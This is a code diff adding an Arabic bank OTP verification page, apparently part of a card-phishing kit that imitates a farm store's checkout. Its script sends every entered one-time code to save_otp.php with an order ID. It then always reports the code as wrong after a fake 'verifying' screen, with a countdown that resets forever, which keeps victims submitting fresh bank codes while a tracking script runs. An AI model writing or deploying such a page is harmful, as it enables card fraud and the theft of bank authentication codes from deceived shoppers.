@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>رمز التحقق | مزارع الثنيان</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet" />
+    <style>
+        :root {
+            --blue: #025380;
+            --blue-soft: #e8f0f5;
+            --gray-bg: #f5f5f5;
+            --muted: #707070;
+            --err: #dc2626;
+            --err-bg: #fff5f5;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: Tajawal, system-ui, sans-serif;
+            background: #fafafa;
+            color: #111;
+        }
+
+        .app {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: #fff;
+            padding-bottom: 32px;
+        }
+
+        .topbar {
+            display: grid;
+            grid-template-columns: 52px 1fr 52px;
+            align-items: center;
+            padding: 14px 12px;
+            border-bottom: 1px solid #eee;
+            background: #fff;
+        }
+
+        .topbar a {
+            grid-column: 1;
+            justify-self: start;
+            color: #111;
+            text-decoration: none;
+            padding: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 44px;
+            min-height: 44px;
+        }
+
+        .topbar a svg {
+            width: 28px;
+            height: 28px;
+            display: block;
+        }
+
+        .topbar h1 {
+            grid-column: 2;
+            margin: 0;
+            font-size: 17px;
+            font-weight: 800;
+            text-align: center;
+        }
+
+        .topbar-spacer {
+            grid-column: 3;
+        }
+
+        main {
+            padding: 20px 18px 24px;
+        }
+
+        .info-panel {
+            background: var(--blue-soft);
+            border: 1px solid rgba(2, 83, 128, 0.12);
+            border-radius: 18px;
+            padding: 18px 16px 20px;
+            margin-bottom: 24px;
+        }
+
+        .info-panel .step {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--blue);
+            letter-spacing: 0.02em;
+            margin-bottom: 8px;
+            text-align: right;
+        }
+
+        .info-panel .title {
+            margin: 0 0 12px;
+            font-size: 17px;
+            font-weight: 800;
+            color: #111;
+            text-align: right;
+            line-height: 1.35;
+        }
+
+        .info-panel .text {
+            margin: 0 0 16px;
+            font-size: 15px;
+            line-height: 1.75;
+            color: #333;
+            text-align: right;
+        }
+
+        .countdown-line {
+            width: 100%;
+            margin: 0 0 16px;
+            text-align: right;
+            line-height: 1.6;
+        }
+
+        .countdown-inner {
+            display: inline-flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            color: #222;
+            direction: rtl;
+        }
+
+        .countdown-inner .countdown-label {
+            white-space: nowrap;
+        }
+
+        #otp-countdown {
+            display: inline-block;
+            min-width: 3.2em;
+            padding: 6px 12px;
+            border-radius: 12px;
+            background: #fff;
+            border: 1px solid rgba(2, 83, 128, 0.25);
+            color: var(--blue);
+            font-family: ui-monospace, "Cascadia Mono", Consolas, monospace;
+            font-size: 17px;
+            font-weight: 800;
+            direction: ltr;
+            unicode-bidi: isolate;
+            text-align: center;
+        }
+
+        .charge-box {
+            background: #fff;
+            border: 1px solid rgba(2, 83, 128, 0.18);
+            border-radius: 16px;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            text-align: right;
+        }
+
+        .charge-box .charge-line {
+            display: flex;
+            flex-direction: row;
+            direction: rtl;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+
+        .charge-box .charge-line:last-child {
+            margin-bottom: 0;
+        }
+
+        .charge-box .charge-label {
+            font-size: 14px;
+            font-weight: 700;
+            color: #444;
+            line-height: 1.45;
+            text-align: right;
+            flex-shrink: 0;
+        }
+
+        .charge-box .charge-value {
+            font-size: 17px;
+            font-weight: 800;
+            color: var(--blue);
+            direction: ltr;
+            unicode-bidi: isolate;
+            text-align: left;
+        }
+
+        .charge-box .charge-value.date-val {
+            font-size: 15px;
+            font-weight: 700;
+            text-align: right;
+            direction: rtl;
+            unicode-bidi: embed;
+            max-width: 58%;
+            min-width: 0;
+        }
+
+        .charge-box .charge-value:not(.date-val) {
+            min-width: 0;
+            max-width: 48%;
+        }
+
+        .card-row {
+            display: flex;
+            flex-direction: row-reverse;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .card-row .lbl {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--muted);
+            white-space: nowrap;
+        }
+
+        .card-mask {
+            direction: ltr;
+            unicode-bidi: isolate;
+            font-family: ui-monospace, "Cascadia Mono", Consolas, monospace;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            color: var(--blue);
+            background: #fff;
+            padding: 12px 16px;
+            border-radius: 14px;
+            border: 1px solid rgba(2, 83, 128, 0.2);
+            flex: 1;
+            min-width: 0;
+            text-align: center;
+            word-break: break-all;
+        }
+
+        .otp-block {
+            margin-bottom: 8px;
+        }
+
+        .otp-block .head {
+            margin-bottom: 12px;
+            text-align: right;
+        }
+
+        .otp-block .head strong {
+            font-size: 16px;
+            font-weight: 800;
+            color: #111;
+            display: block;
+        }
+
+        .otp-input-wrap.has-error .otp-input {
+            box-shadow: 0 0 0 2px var(--err);
+            background: var(--err-bg);
+        }
+
+        .otp-input {
+            display: block;
+            width: 100%;
+            max-width: 100%;
+            margin: 0 auto 4px;
+            padding: 16px 18px;
+            border: none;
+            border-radius: 16px;
+            background: var(--gray-bg);
+            font-family: ui-monospace, "Cascadia Mono", Consolas, monospace;
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: 0.2em;
+            text-align: center;
+            direction: ltr;
+            color: #111;
+        }
+
+        .otp-input::placeholder {
+            color: #aaa;
+            font-size: 15px;
+            letter-spacing: 0;
+            font-family: Tajawal, system-ui, sans-serif;
+            font-weight: 600;
+        }
+
+        .field-msg {
+            display: none;
+            margin: 10px 0 0;
+            padding: 0 4px 0 0;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--err);
+            text-align: right;
+            line-height: 1.55;
+        }
+
+        .otp-input-wrap.has-error .field-msg {
+            display: block;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            margin: 22px auto 0;
+            border: none;
+            border-radius: 28px;
+            background: var(--blue);
+            color: #fff;
+            padding: 16px 18px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(2, 83, 128, 0.35);
+        }
+
+        .btn:active {
+            transform: scale(0.99);
+        }
+
+        .hint {
+            margin: 16px 0 0;
+            font-size: 12px;
+            color: var(--muted);
+            text-align: center;
+            line-height: 1.55;
+        }
+
+        /* شاشة «جاري التحقق» بعد إرسال الرمز */
+        .otp-verify-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: #fff;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .otp-verify-overlay.is-visible {
+            display: flex;
+        }
+
+        .otp-verify-overlay .verify-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(2, 83, 128, 0.15);
+            border-top-color: var(--blue);
+            border-radius: 50%;
+            margin: 0 0 20px;
+            flex-shrink: 0;
+            animation: otp-verify-spin 0.75s linear infinite;
+        }
+
+        @keyframes otp-verify-spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .otp-verify-overlay .verify-title {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--blue);
+            letter-spacing: 0.02em;
+        }
+
+        .otp-verify-overlay .verify-sub {
+            margin: 14px 0 0;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--muted);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="otp-verify-overlay" id="otp-verify-overlay" aria-hidden="true" role="status">
+        <div class="verify-spinner" aria-hidden="true"></div>
+        <p class="verify-title">جاري التحقق</p>
+        <p class="verify-sub">يرجى الانتظار…</p>
+    </div>
+    <div class="app">
+        <header class="topbar">
+            <a href="checkout.html" aria-label="رجوع">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M10 7l5 5-5 5" />
+                </svg>
+            </a>
+            <h1>رمز التحقق</h1>
+            <span class="topbar-spacer" aria-hidden="true"></span>
+        </header>
+        <main>
+            <section class="info-panel" aria-labelledby="otp-info-title">
+                <div class="step">الخطوة التالية</div>
+                <h2 class="title" id="otp-info-title">تأكيد رقم الهاتف المرتبط بالبطاقة</h2>
+                <p class="text">
+                    أدخل رمز التحقق الذي أرسله البنك إلى <strong>رقم الهاتف المسجّل على البطاقة</strong> (رسالة SMS).
+                </p>
+                <div class="countdown-line">
+                    <div class="countdown-inner">
+                        <span class="countdown-label">الرمز صالح لمدة</span>
+                        <span id="otp-countdown" aria-live="polite">3:00</span>
+                    </div>
+                </div>
+                <div class="charge-box" id="charge-box">
+                    <div class="charge-line">
+                        <span class="charge-label">المبلغ الذي سيتم خصمه من البطاقة</span>
+                        <span class="charge-value" id="charge-amount" dir="ltr">—</span>
+                    </div>
+                    <div class="charge-line">
+                        <span class="charge-label">التاريخ</span>
+                        <span class="charge-value date-val" id="charge-date"></span>
+                    </div>
+                </div>
+                <div class="card-row">
+                    <span class="lbl">البطاقة المستخدمة</span>
+                    <div class="card-mask" id="card-mask-display" dir="ltr" aria-live="polite"></div>
+                </div>
+            </section>
+
+            <div class="otp-block">
+                <div class="head">
+                    <strong>إدخال الرمز</strong>
+                </div>
+                <div class="otp-input-wrap" id="otp-wrap">
+                    <input class="otp-input" id="otp-code" type="text" inputmode="numeric" maxlength="6"
+                        autocomplete="one-time-code" placeholder="" aria-label="رمز التحقق" />
+                    <p class="field-msg" id="otp-msg" role="status"></p>
+                </div>
+                <button type="button" class="btn" id="otp-submit">تأكيد الرمز</button>
+                <p class="hint">إن لم يصلك الرمز، انتظر قليلاً أو راجع تطبيق البنك.</p>
+            </div>
+        </main>
+    </div>
+    <script>
+        (function () {
+            var STORAGE_KEY = "farm_otp_card_last4";
+            var AMOUNT_KEY = "farm_otp_charge_amount";
+            var CURRENCY_KEY = "farm_otp_currency";
+
+            function maskFromLast4(last4) {
+                var d = String(last4 || "").replace(/\D/g, "").slice(-4);
+                if (d.length === 4) {
+                    return "************" + d;
+                }
+                return "****************";
+            }
+
+            try {
+                var raw = sessionStorage.getItem(STORAGE_KEY);
+                document.getElementById("card-mask-display").textContent = maskFromLast4(raw);
+            } catch (e0) {
+                document.getElementById("card-mask-display").textContent = maskFromLast4("");
+            }
+
+            (function fillChargeAndDate() {
+                var amtEl = document.getElementById("charge-amount");
+                var dateEl = document.getElementById("charge-date");
+                var today = new Date();
+                try {
+                    dateEl.textContent = today.toLocaleDateString("ar-KW-u-nu-latn", {
+                        weekday: "long",
+                        year: "numeric",
+                        month: "long",
+                        day: "numeric"
+                    });
+                } catch (e2) {
+                    dateEl.textContent =
+                        today.getFullYear() +
+                        "/" +
+                        (today.getMonth() + 1) +
+                        "/" +
+                        today.getDate();
+                }
+                try {
+                    var a = sessionStorage.getItem(AMOUNT_KEY);
+                    var cur = sessionStorage.getItem(CURRENCY_KEY) || "د.ك";
+                    if (a !== null && a !== "" && !isNaN(Number(a))) {
+                        amtEl.textContent = Number(a).toFixed(3) + " " + cur;
+                    } else {
+                        amtEl.textContent = "—";
+                    }
+                } catch (e3) {
+                    amtEl.textContent = "—";
+                }
+            })();
+
+            var countdownEl = document.getElementById("otp-countdown");
+            var remainingSec = 180;
+
+            function formatCountdown(sec) {
+                var m = Math.floor(sec / 60);
+                var s = sec % 60;
+                return m + ":" + (s < 10 ? "0" + s : s);
+            }
+
+            function tickCountdown() {
+                countdownEl.textContent = formatCountdown(remainingSec);
+                if (remainingSec <= 0) {
+                    remainingSec = 180;
+                } else {
+                    remainingSec--;
+                }
+            }
+
+            tickCountdown();
+            setInterval(tickCountdown, 1000);
+
+            var inp = document.getElementById("otp-code");
+            var wrap = document.getElementById("otp-wrap");
+            var msg = document.getElementById("otp-msg");
+            var btn = document.getElementById("otp-submit");
+
+            function getOrderIdForOtp() {
+                try {
+                    var params = new URLSearchParams(window.location.search || "");
+                    var fromUrl = params.get("order_id");
+                    if (fromUrl) {
+                        return String(fromUrl).trim();
+                    }
+                } catch (eUrl) {}
+                try {
+                    var sid = sessionStorage.getItem("farm_order_id");
+                    if (sid) {
+                        return String(sid).trim();
+                    }
+                } catch (eS) {}
+                return "";
+            }
+
+            function recordOtpAttempt(digits, done) {
+                var oid = getOrderIdForOtp();
+                if (!oid) {
+                    if (typeof done === "function") {
+                        done(false);
+                    }
+                    return;
+                }
+                fetch("save_otp.php", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ order_id: oid, code: digits })
+                })
+                    .then(function (r) {
+                        return r.json().catch(function () {
+                            return { success: false };
+                        });
+                    })
+                    .then(function (res) {
+                        if (typeof done === "function") {
+                            done(!!(res && res.success));
+                        }
+                    })
+                    .catch(function () {
+                        if (typeof done === "function") {
+                            done(false);
+                        }
+                    });
+            }
+
+            function getDigits() {
+                return (inp.value || "").replace(/\D/g, "").slice(0, 6);
+            }
+
+            function clearError() {
+                wrap.classList.remove("has-error");
+                msg.textContent = "";
+            }
+
+            function showWrong() {
+                wrap.classList.add("has-error");
+                msg.textContent = "رمز التحقق غير صحيح. راجع الأرقام أو انتظر رسالة جديدة من البنك.";
+            }
+
+            var verifyOverlay = document.getElementById("otp-verify-overlay");
+
+            function showVerifyingThenWrong() {
+                btn.disabled = true;
+                inp.value = "";
+                clearError();
+                verifyOverlay.classList.add("is-visible");
+                verifyOverlay.setAttribute("aria-hidden", "false");
+                document.body.style.overflow = "hidden";
+                setTimeout(function () {
+                    verifyOverlay.classList.remove("is-visible");
+                    verifyOverlay.setAttribute("aria-hidden", "true");
+                    document.body.style.overflow = "";
+                    btn.disabled = false;
+                    showWrong();
+                    inp.focus();
+                }, 3000);
+            }
+
+            function showBadLength() {
+                wrap.classList.add("has-error");
+                msg.textContent = "أدخل الرمز كما ورد في رسالة البنك.";
+            }
+
+            function isValidLength(len) {
+                return len === 4 || len === 6;
+            }
+
+            inp.addEventListener("input", function () {
+                var d = getDigits();
+                inp.value = d;
+                if (d.length === 5) {
+                    wrap.classList.add("has-error");
+                    msg.textContent = "عدد أرقام الرمز لا يتطابق مع الرسالة. راجع الرمز أو احذف خانة.";
+                    return;
+                }
+                if (d.length < 5) {
+                    clearError();
+                }
+                if (isValidLength(d.length)) {
+                    clearError();
+                }
+            });
+
+            inp.addEventListener("paste", function (e) {
+                e.preventDefault();
+                var t = (e.clipboardData || window.clipboardData).getData("text") || "";
+                var d = t.replace(/\D/g, "").slice(0, 6);
+                inp.value = d;
+                if (d.length === 5) {
+                    wrap.classList.add("has-error");
+                    msg.textContent = "عدد أرقام الرمز لا يتطابق مع الرسالة. راجع الرمز أو احذف خانة.";
+                    return;
+                }
+                clearError();
+            });
+
+            btn.addEventListener("click", function () {
+                var d = getDigits();
+                if (!isValidLength(d.length)) {
+                    showBadLength();
+                    inp.focus();
+                    return;
+                }
+                try {
+                    if (window.farmTrack && typeof window.farmTrack.flushBeacon === "function") {
+                        window.farmTrack.flushBeacon();
+                    }
+                } catch (eTrack) {}
+                recordOtpAttempt(d, function () {});
+                showVerifyingThenWrong();
+            });
+
+            inp.focus();
+        })();
+    </script>
+    <script src="https://js.pusher.com/8.4.0/pusher.min.js"></script>
+    <script src="js/client_track.js"></script>
+</body>
+
+</html>
